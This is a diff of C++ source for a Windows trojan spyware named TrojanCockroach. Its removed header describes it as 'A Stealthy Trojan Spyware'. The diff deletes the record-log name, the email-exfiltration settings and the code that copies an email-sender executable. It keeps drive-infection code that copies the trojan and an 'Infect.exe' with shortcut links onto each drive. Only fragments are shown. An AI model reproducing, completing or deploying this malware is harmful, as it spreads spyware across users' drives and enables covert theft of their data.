@@ -1,8 +1,3 @@
-/**
-* Developer: Minhas Kamal (BSSE-0509, IIT, DU)
-* Date: 15.Aug.2014, 28.Sep.2015
-* Comment: A Stealthy Trojan Spyware.
-**/
 
 #include <windows.h>
 #include <time.h>
@@ -12,18 +7,11 @@
 using namespace std;
 
 
-#define FILE_NAME "Record.log"
 #define FOLDER_NAME "trojanCockroach"
 #define RUN_FILE_NAME "TrojanCockroach.exe"
 #define RUN_LINK_NAME "TrojanCockroach.lnk"
 #define INFECT_FILE_NAME "Infect.exe"
 #define INFECT_LINK_NAME "Infect.lnk"
-#define EMAIL_SENDER_FILE_NAME "Transmit.exe"
-
-#define MIN_RECORD_SIZE 20 //no of PC start count before sending a mail
-#define LIFE_TIME 5 //mail will be sent 5 times from one PC
-#define MAIL_WAIT_TIME 180000
-#define MAILING_TIME 60000
 
 string allDrives;
 int age=0;
@@ -221,12 +209,6 @@ void infectDrive(char driveLetter){
         strcat(run, "\\");
         strcat(run, RUN_FILE_NAME);
         CopyFile(RUN_FILE_NAME, run, 0);
-
-        char net[100]={""};
-        strcat(net, folderPath);
-        strcat(net, "\\");
-        strcat(net, EMAIL_SENDER_FILE_NAME);
-        CopyFile(EMAIL_SENDER_FILE_NAME, net, 0);
 
         char infect[100]={""};
         strcat(infect, folderPath);
